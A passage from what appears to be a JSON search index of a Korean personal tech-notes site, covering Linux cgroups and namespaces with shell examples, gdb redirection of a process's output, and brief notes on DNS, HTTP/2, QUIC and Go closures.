살필 수 있다.\n$ systemd-cgtop  현재 process에 적용된 정책을 살펴보자\n$ cat /sys/fs/cgroup/cpu/system.slice/smbd.service/cpu.shares 1024 $ systemctl set-property smbd.service CPUShares=200 $ systemctl show -p CPUShares smbd.service CPUShares=200 $ cat /sys/fs/cgroup/cpu/system.slice/smbd.service/cpu.shares 200  cpu $ ls /sys/fs/cgroup/cpu cgroup.clone_children cpu.cfs_period_us cpu.rt_runtime_us cpuacct.stat notify_on_release tasks cgroup.procs cpu.cfs_quota_us cpu.shares cpuacct.usage release_agent user.slice cgroup.sane_behavior cpu.rt_period_us cpu.stat cpuacct.usage_percpu system.slice  주요 I/F는 아래와 같다.\n   I/F Description     cpu.shares CPU core의 점유율을 2~262114의 수치로 지정한다(default 1024).   cpu.cfs_period_us CPU 사용 시간 비율의 상한을 지정(default는 무제한)   cpu.cfs_quota_us     cpuset cpuset을 이용해 process별 core 사용에 대한 제한을 가한다.\n$ ls /sys/fs/cgroup/cpuset cgroup.clone_children cpuset.effective_cpus cpuset.memory_pressure cpuset.sched_load_balance cgroup.procs cpuset.effective_mems cpuset.memory_pressure_enabled cpuset.sched_relax_domain_level cgroup.sane_behavior cpuset.mem_exclusive cpuset.memory_spread_page notify_on_release cpuset.cpu_exclusive cpuset.mem_hardwall cpuset.memory_spread_slab release_agent cpuset.cpus cpuset.memory_migrate cpuset.mems tasks  주요 I/F는 아래와 같다.\n   I/F Description     cpuset.cpus process를 실행하는 CPU core 지정.   cpuset.cpu_exclusive 1로 set되면 이 group이 지정한 cpu cores는 다른 group에서 지정하지 못한다.   cpuset.mems NUMA architecture의 process가 이용하는 memory node를 지정.    stress tool을 사용해서 비교 해본다.\n$ unshare /bin/sh $ pstree -p systemd(1)-+-agetty(194) |-agetty(195) |-avahi-daemon(262)---avahi-daemon(263) |-dbus-daemon(190) |-docker(198)-+-{docker}(200) | |-{docker}(201) | |-{docker}(202) | |-{docker}(204) | `-{docker}(206) |-haveged(193) |-nmbd(207) |-smbd(256)---smbd(260) |-sshd(199)-+-sshd(266)---bash(273) | `-sshd(285)---bash(287)---sh(332)---pstree(344) |-systemd(269)---(sd-pam)(270) |-systemd-journal(115) |-systemd-logind(189) |-systemd-resolve(197) |-systemd-timesyn(182)---{sd-resolve}(184) `-systemd-udevd(141) $ stress -m 3 --vm-bytes 128m -t 60s $ top  4개 core를 모두 100% 사용함을 확인할 수 있다. 이제 cgroup으로 제약을 가한다.\n$ cd /sys/fs/cgroup/cpuset/ $ mkdir test/ $ cd test/ $ echo 0 \u0026gt; cpuset.cpus $ echo 0 \u0026gt; cpuset.mems $ echo 332 \u0026gt; tasks  같은 test를 반복한다.\n$ stress -m 3 --vmbytes 128m -t 60s $ top  0번 core만 사용됨을 알 수 있다.\nmemory process 별 memory 사용에 대한 제약을 가한다. memory가 부족할 경우 적용할 사항을 oom_control을 통해 조정해 줄 수 있다. $ ls /sys/fs/cgroup/memory cgroup.clone_children memory.kmem.tcp.max_usage_in_bytes memory.pressure_level cgroup.event_control memory.kmem.tcp.usage_in_bytes memory.soft_limit_in_bytes cgroup.procs memory.kmem.usage_in_bytes memory.stat cgroup.sane_behavior memory.limit_in_bytes memory.swappiness memory.failcnt memory.max_usage_in_bytes memory.usage_in_bytes memory.force_empty memory.memsw.failcnt memory.use_hierarchy memory.kmem.failcnt memory.memsw.limit_in_bytes notify_on_release memory.kmem.limit_in_bytes memory.memsw.max_usage_in_bytes release_agent memory.kmem.max_usage_in_bytes memory.memsw.usage_in_bytes system.slice memory.kmem.slabinfo memory.move_charge_at_immigrate tasks memory.kmem.tcp.failcnt memory.numa_stat user.slice memory.kmem.tcp.limit_in_bytes memory.oom_control  주요 I/F는 아래와 같다.\n   I/F Description     memory.limit_in_bytes 해당 group을 이용할 수 있는 물리 memory의 상한(byte)을 지정   memory.memsw.limit_in_bytes 해당 group을 이용할 수 있는 \u0026lsquo;물리 memory + swap영역\u0026rsquo;의 상한(byte)을 지정   memory.use_hierachy 1이 set되면 해당 group의 memory 사용량에 sub group의 process memory 사용량도 추가된다(default는 0).    $ cd /sys/fs/cgroup/memory $ mkdir group1 $ echo 128M \u0026gt; group1/memory.limit_in_bytes $ echo $$ \u0026gt; group1/tasks $ stress --vm 1 --vm-bytes 127M --timeout 60s $ stress --vm 1 --vm-bytes 128M --timeout 60s $ echo 1 \u0026gt; group1/memory.oom_control $ echo 2G \u0026gt; group1/memory.limit_in_bytes $ stress --vm 1 --vm-bytes 512M --timeout 60s $ stress --vm 1 --vm-bytes 1G --timeout 60s $ echo 0 \u0026gt; group1/memory.oom_control $ stress --vm 1 --vm-bytes 512M --timeout 60s $ stress --vm 1 --vm-bytes 1G --timeout 60s  device device file의 사용에 대한 제한을 가한다. 3가지 file이 있다. * devices.allow : whitelist * devices.deny : blacklist * devices.list : 사용가능한 device\n각각에 대해서 4가지 filed가 있다.\n Type :  a : all c : char device b : block device  Major number Minor number Access :  r : read w : write m : mknode   /dev/null 의 경우 major는 1 minor는 3이다.\n$ mkdir /sys/fs/cgroup/devices/0 $ cat /sys/fs/cgroup/devices/0/devices.list a \u0026quot;:\u0026quot; rwm $ echo \u0026quot;a *:* rmw\u0026quot; \u0026gt; /sys/fs/cgroup/devices/0/devices.deny $ echo $$ \u0026gt; /sys/fs/cgroup/devices/0/tasks $ echo \u0026quot;test \u0026gt; /dev/null bash: /dev/null: Operation not permitted $ echo \u0026quot;a *.* rwm\u0026quot; \u0026gt; /sys/fs/cgroup/devices/0/devices.allow $ echo \u0026quot;test\u0026quot; \u0026gt; /dev/null blkio $ ls /sys/fs/cgroup blkio.io_merged blkio.io_service_bytes_recursive blkio.io_wait_time blkio.sectors blkio.throttle.read_iops_device blkio.weight notify_on_release blkio.io_merged_recursive blkio.io_service_time blkio.io_wait_time_recursive blkio.sectors_recursive blkio.throttle.write_bps_device blkio.weight_device release_agent blkio.io_queued blkio.io_service_time_recursive blkio.leaf_weight blkio.throttle.io_service_bytes blkio.throttle.write_iops_device cgroup.clone_children system.slice blkio.io_queued_recursive blkio.io_serviced blkio.leaf_weight_device blkio.throttle.io_serviced blkio.time cgroup.procs tasks blkio.io_service_bytes blkio.io_serviced_recursive blkio.reset_stats blkio.throttle.read_bps_device blkio.time_recursive cgroup.sane_behavior user.slice  주요 I/F는 아래와 같다.\n   I/F Description     blkio.weight 모든 block device에 공통적인 우선순위를 100~1000의 값으로 지정(default는 500).   blkio.weight_device 특정 device에 대한 우선순위를 지정.   blkio.throttle.read_bps_device 특정 device에 대한 접근 속도의 상한을 Bytes/Sec 단위로 지정.   blkio.throttle.write_bps_device    blkio.throttle.read_iops_device 특정 dsevice에 대한 접근 속도의 상한을 IOPS 단위로 지정.   blkio.throttle.write_iops_device     Reference https://www.linuxfoundation.jp/jp_uploads/seminar20081119/CgroupMemcgMaster.pdf https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Resource_Management_Guide/sec-memory.html "
},
{
	"uri": "https://keyolk.github.io/system/deadlock/",
	"title": "deadlock",
	"tags": [],
	"description": "",
	"content": " Mutual Exclusion Hold and Wait No Preemption Circular Wait  "
},
{
	"uri": "https://keyolk.github.io/architecture/distributed_system/",
	"title": "distributed system",
	"tags": [],
	"description": "",
	"content": " Distributed System Distributed System에서 갖추는 feature들을 이해를 위한 정리.\n replication availability\n reliability\n performance\n scalability\n capacity\n security\n  Related Alrogithms  bully raft paxos zap  "
},
{
	"uri": "https://keyolk.github.io/network/dns/",
	"title": "dns",
	"tags": [],
	"description": "",
	"content": " Record A 192.0.2.1  CNAME hostname.example.com  SRV 10 5 80 hostname.example.com  각각 우선순위, 가중치, 포트를 나타냄.\n"
},
{
	"uri": "https://keyolk.github.io/language/functional_programming/",
	"title": "functional programming",
	"tags": [],
	"description": "",
	"content": " Functional Programming  Immutability First-class, high-order functions Lazy evaluation  "
},
{
	"uri": "https://keyolk.github.io/network/http/",
	"title": "http",
	"tags": [],
	"description": "",
	"content": " HTTP/1.1 Issue  Head-of-line blocking, HoL  Single request / connection Request must be responded in order, FIFO  No optimised well  Uncompressed headers Redundant headers  Lack of Server-side push  SPDY\u0026amp;HTTP2  Multiplexed streams  Multiple stream over single TCP connection  Request Prioritization HTTP header compression  HPACK format Huffman code  Server Push  TCP/TLS Issue  HoL TCP 3-way handshaking TLS negotiation handshaking Large backoff on packet loss Poor perforamnce in mobile  QUIC Quick UDP Internet Connections\n"
},
{
	"uri": "https://keyolk.github.io/",
	"title": "keyolk&#39;s page",
	"tags": [],
	"description": "",
	"content": " About Me Working History\n 2017.06- : Search System DevOps 2017.01-2017.06: PaaS/MultiCloud R\u0026amp;D 2015.07-2016.12: Cloud/Container Architecture R\u0026amp;D 2013.01-2014.12: DRM/CAS Development 2012.07-2012.12: Web Application Development  Current Interests\n Cloud Native. Container Architecture. CI/CD. Logging. Monitoring. Identity\u0026amp;Access Management.  "
},
{
	"uri": "https://keyolk.github.io/language/lambda/",
	"title": "lambda",
	"tags": [],
	"description": "",
	"content": " Lambda Calculus  Anonymous Function: 이름을 갖을 필요가 없다. Currying: 두 개 이상의 입력이 있는 함수는 최종적으로 1개의 입력만 받는 Lambda Calculus로 단순화 될 수 있다.  Lambda Function  Anonymous Function First-class Function  Labda Function \u0026amp; Lambda Expression IIFE Immediately Invoked Function Expression\nfunc(twoSeconds time.Duration) { // use twoSeconds }(time.Second * 2)  Closure  Free\u0026amp;Bound Variable Opend\u0026amp;Closed Expression  익명 함수가 함수 내 정의 되지 않은 변수를 참조하는 경우. 지역 함수가 전역 변수를 참조하는것과 유사함.\nUsage Isolating Data package main import \u0026quot;fmt\u0026quot; func main() { gen := makeFibGen() for i := 0; i \u0026lt; 10; i++ { fmt.Println(gen()) } } func makeFibGen() func() int { f1 := 0 f2 := 1 return func() int { f2, f1 = (f1 + f2), f2 return f1 } }  Wrapping Functions and Creating Middleware package main import ( \u0026quot;fmt\u0026quot; \u0026quot;net/http\u0026quot; \u0026quot;time\u0026quot; ) func main() { http.HandleFunc(\u0026quot;/hello\u0026quot;, timed(hello)) http.ListenAndServe(\u0026quot;:3000\u0026quot;, nil) } func timed(f func(http.ResponseWriter, *http.Request)) func(http.ResponseWriter, *http.Request) { return func(w http.ResponseWriter, r *http.Request) { start := time.Now() f(w, r) end := time.Now() fmt.Println(\u0026quot;The request took\u0026quot;, end.Sub(start)) } } func hello(w http.ResponseWriter, r *http.Request) { fmt.Fprintln(w, \u0026quot;\u0026lt;h1\u0026gt;Hello!\u0026lt;/h1\u0026gt;\u0026quot;) }  Accessing data that typically isn\u0026rsquo;t available package main import ( \u0026quot;fmt\u0026quot; \u0026quot;net/http\u0026quot; ) type Database struct { Url string } func NewDatabase(url string) Database { return Database{url} } func main() { db := NewDatabase(\u0026quot;localhost:5432\u0026quot;) http.HandleFunc(\u0026quot;/hello\u0026quot;, hello(db)) http.ListenAndServe(\u0026quot;:3000\u0026quot;, nil) } func hello(db Database) func(http.ResponseWriter, *http.Request) { return func(w http.ResponseWriter, r *http.Request) { fmt.Fprintln(w, db.Url) } }  Binary Searching with the sort package package main import ( \u0026quot;fmt\u0026quot; \u0026quot;sort\u0026quot; ) func main() { numbers := []int{1, 11, -5, 8, 2, 0, 12} sort.Ints(numbers) fmt.Println(\u0026quot;Sorted:\u0026quot;, numbers) index := sort.Search(len(numbers), func(i int) bool { return numbers[i] \u0026gt;= 7 }) fmt.Println(\u0026quot;The first number \u0026gt;= 7 is at index:\u0026quot;, index) fmt.Println(\u0026quot;The first number \u0026gt;= 7 is:\u0026quot;, numbers[index]) }  Deferring Work go func() { result := doWork1(a, b) result = doWork2(result) result = doWork3(result) // Use the final result }() fmt.Println(\u0026quot;hi!\u0026quot;)  "
},
{
	"uri": "https://keyolk.github.io/system/linux/",
	"title": "linux",
	"tags": [],
	"description": "",
	"content": " Linux 관련 feature에 대한 이해를 위한 정리. Filesystem, Resource Isolation, Event Trigger, Module 등.\nContents  criu   cgroup   metric   namespace   proxy   vagrant    namespace cgroup capabilities mounts fuse inotify epoll pipe systemd rootfs chroot lkm device environment keyring ipc cmdline zone id  STDIO buffering 아래에 이와 관련된 문제에 대해 상세히 기술되어 있다.\nhttp://www.pixelbeat.org/programming/stdio_buffering/\n어떻게 이 현상을 fix 할 것인지.\nhttps://www.perkin.org.uk/posts/how-to-fix-stdio-buffering.html\nRedirect Outputs of Running Process 아래와 같은 상황을 가정하자.\n$ hugo server -v  잘동작하는걸 확인했으므로 Background로 돌린다.\nctrl+z\n$ bg  [1] + 23106 continued hugo server -v  이 상태에선 hugo server가 message를 만들면 그대로 terminal에 나타나게 된다.\n$ ls -l /proc/23016/fd  total 0 lrwx------ 1 keyolk keyolk 64 Jan 16 10:59 0 -\u0026gt; /dev/pts/1 lrwx------ 1 keyolk keyolk 64 Jan 16 10:59 1 -\u0026gt; /dev/pts/1 lr-x------ 1 keyolk keyolk 64 Jan 16 10:59 10 -\u0026gt; pipe:[20424904] l-wx------ 1 keyolk keyolk 64 Jan 16 10:59 11 -\u0026gt; pipe:[20424904] lrwx------ 1 keyolk keyolk 64 Jan 16 10:59 12 -\u0026gt; socket:[20424905] lrwx------ 1 keyolk keyolk 64 Jan 16 10:59 2 -\u0026gt; /dev/pts/1 lr-x------ 1 keyolk keyolk 64 Jan 16 10:59 3 -\u0026gt; anon_inode:inotify lrwx------ 1 keyolk keyolk 64 Jan 16 10:59 4 -\u0026gt; anon_inode:[eventpoll] lrwx------ 1 keyolk keyolk 64 Jan 16 10:59 5 -\u0026gt; anon_inode:[eventpoll] lr-x------ 1 keyolk keyolk 64 Jan 16 10:59 6 -\u0026gt; pipe:[20421334] l-wx------ 1 keyolk keyolk 64 Jan 16 10:59 7 -\u0026gt; pipe:[20421334] lr-x------ 1 keyolk keyolk 64 Jan 16 10:59 8 -\u0026gt; anon_inode:inotify lrwx------ 1 keyolk keyolk 64 Jan 16 10:59 9 -\u0026gt; anon_inode:[eventpoll]  $ sudo gdb -p 20106  (gdb) p dup2(open(\u0026quot;/dev/null\u0026quot;, 0), 1) $1 = 1 (gdb) p dup2(open(\u0026quot;/dev/null\u0026quot;, 0), 2) $2 = 2 (gdb) detach (gdb) quit  확인해 본다.\n$ ls -l /proc/23016/fd  total 0 lrwx------ 1 keyolk keyolk 64 Jan 16 10:59 0 -\u0026gt; /dev/pts/1 lr-x------ 1 keyolk keyolk 64 Jan 16 10:59 1 -\u0026gt; /dev/null lr-x------ 1 keyolk keyolk 64 Jan 16 10:59 10 -\u0026gt; pipe:[20424904] l-wx------ 1 keyolk keyolk 64 Jan 16 10:59 11 -\u0026gt; pipe:[20424904] lrwx------ 1 keyolk keyolk 64 Jan 16 10:59 12 -\u0026gt; socket:[20424905] lr-x------ 1 keyolk keyolk 64 Jan 16 11:03 13 -\u0026gt; /dev/null lr-x------ 1 keyolk keyolk 64 Jan 16 11:03 14 -\u0026gt; /dev/null lr-x------ 1 keyolk keyolk 64 Jan 16 10:59 2 -\u0026gt; /dev/null lr-x------ 1 keyolk keyolk 64 Jan 16 10:59 3 -\u0026gt; anon_inode:inotify lrwx------ 1 keyolk keyolk 64 Jan 16 10:59 4 -\u0026gt; anon_inode:[eventpoll] lrwx------ 1 keyolk keyolk 64 Jan 16 10:59 5 -\u0026gt; anon_inode:[eventpoll] lr-x------ 1 keyolk keyolk 64 Jan 16 10:59 6 -\u0026gt; pipe:[20421334] l-wx------ 1 keyolk keyolk 64 Jan 16 10:59 7 -\u0026gt; pipe:[20421334] lr-x------ 1 keyolk keyolk 64 Jan 16 10:59 8 -\u0026gt; anon_inode:inotify lrwx------ 1 keyolk keyolk 64 Jan 16 10:59 9 -\u0026gt; anon_inode:[eventpoll]  반대로 background process의 output을 보이게 할수도 있다.\n$ hugo server \u0026amp;\u0026gt; /dev/null \u0026amp;  [1] 31130  $ sudo gdb -p 31130  (gdb) p dup2(open(\u0026quot;/dev/pts/1\u0026quot;, 1), 1) $1 = 1 (gdb) p dup2(open(\u0026quot;/dev/pts/1\u0026quot;, 1), 2) $2 = 2 (gdb) detach (gdb) quit  이 시점에서 output이 terminal로 들어온다.\n"
},
{
	"uri": "https://keyolk.github.io/system/linux/metric/",
	"title": "metric",
	"tags": [],
	"description": "",
	"content": " CPU Load Memory I/O Net RX/TX "
},
{
	"uri": "https://keyolk.github.io/architecture/msa/",
	"title": "msa",
	"tags": [],
	"description": "",
	"content": " Intro MSA, Micro Service Architecutre\nPolyglog "
},
{
	"uri": "https://keyolk.github.io/system/linux/namespace/",
	"title": "namespace",
	"tags": [],
	"description": "",
	"content": " Namespace를 통해 Kernel 내 Global Resource에 대해 Process 별로 Partitioning을 제공한다. 기본적으로 Parent Process의 Namespace를 Child 에서 상속받는다.\n   Namespace Constant Related Resource Supporting Version     Mount CLONE_NEWNS Mount Points 2.4.19   UTS CLONE_NEWUTS Hostname, NIS domain name 2.6.24   IPC CLONE_NEWIPC SystemV IPC, POSIX Message Queue 2.6.24   PID CLONE_NEWPID Process IDs 2.6.24   Net CLONE_NEWNET Network Stacks 2.6.29   User CLONE_NEWUSER Network Stacks 3.8   CGroup CLONE_NEWCGROUP Network Stacks 4.6    아래 System Call을 통해 Namespace를 다룰 수 있다.\n clone() unshare() setns()  User를 제외한 5가지 Namespace에 대해선 CAP_SYS_ADMIN capabilities가 필요하다. 모든 Process는 procfs에서 아래와 같이 namespace 정보를 inode 형태로 가지고 있다. 같은 namespace에 속한 process는 같은 inode 값을 갖는다.\n$ ls -l /proc/$$/ns total 0 lrwxrwxrwx. 1 mtk mtk 0 Jan 14 01:20 ipc -\u0026gt; ipc:[4026531839] lrwxrwxrwx. 1 mtk mtk 0 Jan 14 01:20 mnt -\u0026gt; mnt:[4026531840] lrwxrwxrwx. 1 mtk mtk 0 Jan 14 01:20 net -\u0026gt; net:[4026531956] lrwxrwxrwx. 1 mtk mtk 0 Jan 14 01:20 pid -\u0026gt; pid:[4026531836] lrwxrwxrwx. 1 mtk mtk 0 Jan 14 01:20 user -\u0026gt; user:[4026531837] lrwxrwxrwx. 1 mtk mtk 0 Jan 14 01:20 uts -\u0026gt; uts:[4026531838]  위 file에 대한 bind mount가 이뤄지면, namespace 내에 속한 모든 process가 terminated 된다고 해도 namespace가 사라지지 않는다. 이 때 해당하는 file descriptor를 setns()를 통해 다른 process로 전달하면 해당 process를 주어진 namespace에 할당해 줄 수 있다.\nKernel이 아래 configuration을 통해 namespace가 지원된다.\n CONFIG_NAMESPACES CONFIG_UTS_NS CONFIG_IPC_NS CONFIG_PID_NS CONFIG_NET_NS CONFIG_USER_NS CONFIG_CGROUP_NS  task가 속한 namespace에 대한 접근은 task_struct의 filed인 nsproxy를 통해서 이뤄진다.\nstruct task_struct : http://lxr.free-electrons.com/source/include/linux/sched.h?v=4.0#L1278 struct nsproxy *nsproxy : http://lxr.free-electrons.com/source/include/linux/sched.h?v=4.0#L1467\nnsproxy 구조체 내에 usernamespace를 제외한 5가지 namespace에 대한 pointer가 존재한다. struct ns_proxy : http://lxr.free-electrons.com/source/include/linux/nsproxy.h?v=4.0#L29\nusernamespace 는 task의 filed 인 cred 내에서 찾아볼 수 있다.\nstruct cred : http://lxr.free-electrons.com/source/include/linux/cred.h?v=4.0#L103 struct user_namespace *user_ns : http://lxr.free-electrons.com/source/include/linux/cred.h?v=4.0#L137 아래에서 namespace를 만드는 function을 확인할 수 있다. create_new_namespaces() : http://lxr.free-electrons.com/source/kernel/nsproxy.c?v=4.0#L59 task는 따로 명시되지 않아도 default로 global namespace에 속해있다.\nstruct nsproxy init_nsproxy : http://lxr.free-electrons.com/source/kernel/nsproxy.c?v=4.0#L31 do_fork() : http://lxr.free-electrons.com/source/kernel/fork.c?v=4.0#L1631 p = copy_process() : http://lxr.free-electrons.com/source/kernel/fork.c?v=4.0#L1659 copy_process() : http://lxr.free-electrons.com/source/kernel/fork.c?v=4.0#L1190 retval = copy_namespaces() : http://lxr.free-electrons.com/source/kernel/fork.c?v=4.0#L1398 copy_namesapces() : http://lxr.free-electrons.com/source/include/linux/nsproxy.h?v=4.0#L65 copy_namesapces() : http://lxr.free-electrons.com/source/kernel/nsproxy.c?v=4.0#L124 Mount Mount Point에 대한 isolation을 제공한다.\n새로 mount namspace에선 생성 시점 이전에 생성된 mount들이 모두 visible하다. 새로 생성된 mount namspace 내에 mount와 unmount는 다른 system에서 invisible하다. rootfs 를 다시 mount 하여 chroot와 비슷한 효과를 가져올 수 있다.\nUser View root$ mkdir test root$ mount -t tmpfs none test root$ mount | grep test none /root/test/test tmpfs rw,relatime 0 0 root$ unshare -pmrf /bin/sh unshared$ mkdir test2 unshared$ mount -t tmpfs none test2 unshared$ cat /proc/mounts | grep test none /root/test/test tmpfs rw,relatime 0 0 none /root/test/test2 tmpfs rw,nodev,relatime 0 0 root$ cat /proc/mounts | grep test none /root/test/test tmpfs rw,relatime 0 0  기본적으로 parent에서 가지고 있는 mount table은 child로 상속되지만, 아래와 같은 mount flag를 통해서 이를 제어할 수 있다.\n \u0026ndash;make-rprivate \u0026ndash;make-rshared  기존 mount entry에 대한 shared flag 여부는 아래와 같이 알아 볼 수 있다.\n$ cat /proc/self/mountinfo | grep shared ... 33 1 8:3 / / rw,relatime shared:1 - ext4 /dev/sda3 rw,data=ordered ...  shared subtree는 2005년에 Ram Pai를 통해 patch가 만들어졌다. mount에 아래와 같은 flag가 추가되었으며,\n –make-slave –make-rslave –make-unbindable –make-runbindable \u0026hellip;  마찬가지로 kernel에 아래와 같은 이름으로 flag가 추가되었다.\n MS_UNBINDABLE MS_PRIVATE MS_SLAVE MS_SHARED  Kernel View 관련 자료구조는 아래와 같다.\nstruct mnt_namespace : http://lxr.free-electrons.com/source/fs/mount.h?v=4.0#L7 copy_mnt_ns() : http://lxr.free-electrons.com/source/fs/namespace.c?v=4.0#L2681 new = copy_tree() : http://lxr.free-electrons.com/source/fs/namespace.c?v=4.0#L2709 copy_tree() : http://lxr.free-electrons.com/source/fs/namespace.c?v=4.0#L1590\nUTS Hostname과 NIS domain name 에 대한 isolation을 제공한다. sethostname(), setdomainname() 으로 해당 값을 설정할 수 있으며, uname(), gethostname(), getdomainname() 으로 현재 할당된 값을 확인할 수 있다.\nUser View root$ uname -n old root$ unshare -u /bin/bash unshared$ hostname new unshared$ uname -n new unshared$ exit root$ uname -n old  Kernel View 관련 자료구조는 아래와 같다.\nhttp://lxr.free-electrons.com/source/include/linux/utsname.h?v=4.0#L23 http://lxr.free-electrons.com/source/include/uapi/linux/utsname.h?v=4.0#L24 기존 gethostname 구현, http://lxr.free-electrons.com/source/kernel/sys.c?v=2.4.37#L1056 여기서 system_utsname 이 global value 이다.\nutsname 위한 새 function 추가, http://lxr.free-electrons.com/source/include/linux/utsname.h?v=4.0#L72 새로운 gethostname() 구현, http://lxr.free-electrons.com/source/kernel/sys.c?v=4.0#L1239 비슷한 구현이 uname(), sethostname()에 적용되었다. uname : http://lxr.free-electrons.com/source/kernel/sys.c?v=4.0#L1139 sethostname : http://lxr.free-electrons.com/source/kernel/sys.c?v=4.0#L1213\nIPC IPC resource(System V IPC와 POSIX message queue)에 대한 isolation을 제공한다. IPC namespace는 SYSTEM V IPC identifier와 POSIX message queue filesystem을 들을 갖고 있다. 위 IPC는 kernel내 아래 2개 configuration으로 정의된다.  CONFIG_POSIX_MQUEUE CONFIG_SYSVIPC  IPC namespace가 destroyed 되면, 속한 모든 IPC object는 자동적으로 destroyed된다.\n격리되는 IPC 자원들은 procfs에서 확인할 수 있다. 아래 procfs의 interface들은 IPC namespace별로 구별된다.\n /proc/sys/fs/mqueue/ : POSIX message queue  msg_default msg_max msgsize_default queues_max  /proc/sys/kernel/ : System V IPC  msgmax msgmnb msgmni sem shmall shmmax shmmni shm_rmid_forced  /proc/sysvipc/ : System V IPC  msb sem shm   # ipcmk -Q Message queue id: 0 # ipcs -q ------ Message Queues -------- key msqid owner perms used-bytes messages 0xd2489e5b 65536 root 644 0 0 # unshare -if /bin/sh # ipcs -q ------ Message Queues -------- key msqid owner perms used-bytes messages  Kernel View 관련 자료구조는 아래와 같다.\nhttp://lxr.free-electrons.com/source/include/linux/ipc_namespace.h?v=4.0#L21\nPID PID에 대한 isolation을 제공한다.\n 새로운 namespace에서 생성된 최초의 task는 pid가 1이 된다. parent namespace에서 자식의 모든 pid를 볼 수 있다. Init process와 유사한 동작을 보인다.  child reaping : 한 process가 죽으면 모든 children 은 부모가 PID 1번이 된다. 동일 namespace의 다른 process가 prctl()을 통해 PR_SET_CHILD_SUBREAPER 설정이 되어있지 않을 때에 한한다. SIGKILL signal은 PID 1번 process를 죽일 수 없다.  PID namespace 내의 init process가 terminated 되면 해당 namespace 내의 모든 process가 종료된다. 32회까지 nested 될 수 있다.  User View $ pstree -p systemd(1)-+-agetty(200) |-agetty(201) |-avahi-daemon(274)---avahi-daemon(276) |-dbus-daemon(197) |-docker(202)-+-{docker}(207) | |-{docker}(208) | |-{docker}(209) | |-{docker}(210) | |-{docker}(216) | |-{docker}(277) | |-{docker}(278) | |-{docker}(279) | |-{docker}(280) | |-{docker}(281) | |-{docker}(282) | `-{docker}(283) |-haveged(194) |-nmbd(212) |-smbd(236)-+-smbd(272) | `-smbd(15603) |-sshd(204)---sshd(5079)---bash(5085)---pstree(5088) |-systemd(5081)---(sd-pam)(5082) |-systemd-journal(119) |-systemd-logind(196) |-systemd-resolve(206) |-systemd-timesyn(189)---{sd-resolve}(191) `-systemd-udevd(140) # unshare -pf --mount-proc /bin/sh $ pstree -p sh(1)---pstree(2)  Kernel View 관련 자료구조는 아래와 같다.\nstruct pid_namespace : http://lxr.free-electrons.com/source/include/linux/pid_namespace.h?v=4.0#L24 MAX_PID_NS_LEVEL : http://lxr.free-electrons.com/source/kernel/pid_namespace.c?v=4.0#L80 struct upid : http://lxr.free-electrons.com/source/include/linux/pid.h?v=4.1#L50 struct pid : http://lxr.free-electrons.com/source/include/linux/pid.h?v=4.1#L57 특정 process를 kill하는 scenario를 생각해보자, \\ signal을 통해서 결과적으로 kernel 내에 아래 function을 부르게 될것이다. kill_something_info() : http://lxr.free-electrons.com/source/kernel/signal.c?v=4.1#L1425 이 function 내에는 아래와 같은 subroutine이 있다. kill_pid_info() : http://lxr.free-electrons.com/source/kernel/signal.c?v=4.1#L1431 kill_pid_info() : http://lxr.free-electrons.com/source/kernel/signal.c?v=4.1#L1339 find_vpid() : http://lxr.free-electrons.com/source/kernel/pid.c#L380?v=4.1#L380 find_pid_ns() : find_vpid() : http://lxr.free-electrons.com/source/kernel/pid.c#L380?v=4.1#L382 param인 *pid로 find_vpid()를 통해 struct pid를 가져온다.\nNet Network Stack에 대한 Isolation을 제공한다.\n 새로 생성된 namespace 엔 loopback 만 존재한다. 다른 namespace의 device를 가져올 수 있다. socket과 device는 하나의 namespace에만 속할 수 있다. namespace간의 통신은 veth를 통해 이뤄질 수 있다.  User View # ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether b8:27:eb:43:56:26 brd ff:ff:ff:ff:ff:ff inet 192.168.137.2/24 brd 192.168.137.255 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::ba27:ebff:fe43:5626/64 scope link valid_lft forever preferred_lft forever 3: docker0: \u0026lt;NO-CARRIER,BROADCAST,MULTICAST,UP\u0026gt; mtu 1500 qdisc noqueue state DOWN group default link/ether 00:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff inet 172.17.42.1/16 scope global docker0 valid_lft forever preferred_lft forever inet6 fe80::fc45:45ff:fec7:1756/64 scope link valid_lft forever preferred_lft forever # unshare -nf /bin/sh $ ip a 1: lo: \u0026lt;LOOPBACK\u0026gt; mtu 65536 qdisc noop state DOWN group default link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00  2개의 namespace를 만든다.\n$ ip netns add myns1 $ ip netns add myns2  myns1 namespace를 지운다.\n$ ip netns del myns1  namespace를 지우면 모든 migratable한 network device 들은 default network namespace로 할당된다. 아래 명령을 사용하여 network namespace를 monitoring 할 수 있다.\n$ ip netns monitor  아래 명령을 통해 현재 존재하는 network namespace를 list up 할 수 있다.\n$ ip netns list  위 명령은 /var/run/netns/ 를 읽게끔 되어있다. 특정 namespace에 속한 process의 id를 아래 명령으로 list 할 수 있다.\n$ ip netns pid [namespace_name]  마찬가지로 특정 pid가 속한 namespace도 알 수 있다.\n$ ip netns identify [pid]  특정 network interface를 namespace로 할당해 줄 수 있다.\n$ ip link set eth0 netns myns1  dev_change_net_namespace() : http://lxr.free-electrons.com/source/include/linux/netdevice.h?v=4.0#L2971 shell을 실행하면서 새로운 namespace에 할당해 줄 수 있다.\n$ ip netns exec myns1 bash  namespace 내에서 ifconfig -a로 검사하면 eth0과 loopback만 존재하는걸 확인할 수 있다. network device에 대해서 inital namespace 설정을 persist 하게 수정할 수 있다.\n$ ip link set eth0 netns1  Kernel View 관련 자료 구조는 아래와 같다.\nstruct net : http://lxr.free-electrons.com/source/include/net/net_namespace.h?v=4.0#L44 network stack 전체가 담겨있다.\n looback device SNMP stat (netns_mib) all network tables : routing, neighboring, etc … all sockets /procfs entries /sysfs entries  하나의 network device는 반드시 하나의 network namspace에 속한다. struct net_device : http://lxr.free-electrons.com/source/include/linux/netdevice.h?v=4.0#L1499 http://lxr.free-electrons.com/source/include/linux/netdevice.h?v=4.0#L1706 related function :\n dev_net() : 